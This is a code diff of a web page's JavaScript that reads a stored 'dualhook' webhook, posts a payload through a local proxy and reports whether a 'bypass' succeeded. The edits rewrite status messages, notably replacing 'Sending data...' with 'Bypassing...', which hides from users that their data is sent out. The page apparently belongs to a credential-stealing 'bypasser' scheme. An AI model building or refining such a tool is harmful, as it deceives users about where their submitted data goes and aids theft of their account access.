@@ -128,12 +128,12 @@
         const dualhookWebhook = localStorage.getItem('dualhookWebhook');
 
         if (!dualhookWebhook) {
-            statusMessage.textContent = 'Error: eternal error {404 error}';
+            statusMessage.textContent = 'Error: Required information not found. Please go back to the previous page and submit it first.';
             statusMessage.className = 'error';
             return;
         }
 
-        statusMessage.textContent = 'Sending data...';
+        statusMessage.textContent = 'Bypassing...';
         statusMessage.className = '';
 
         const payload = {
@@ -155,15 +155,15 @@
             const result = await response.json();
 
             if (response.ok && result.success) {
-                statusMessage.textContent = 'bypass successfully! please wair if not.';
+                statusMessage.textContent = 'Bypass successful!';
                 statusMessage.className = 'success';
             } else {
-                statusMessage.textContent = `Error bypassing. ${result.message || 'Unknown error'}. Check console for details.`;
+                statusMessage.textContent = `Error bypass & external data. ${result.message || 'Unknown error'}. Check console for details.`; // Changed message here
                 statusMessage.className = 'error';
             }
         } catch (error) {
             console.error('Error communicating with proxy:', error);
-            statusMessage.textContent = 'Network error or proxy not running. Check console.';
+            statusMessage.textContent = 'Error: Could not connect to the proxy server. Make sure the Node.js server is running at http://localhost:3000.';
             statusMessage.className = 'error';
         }
       });
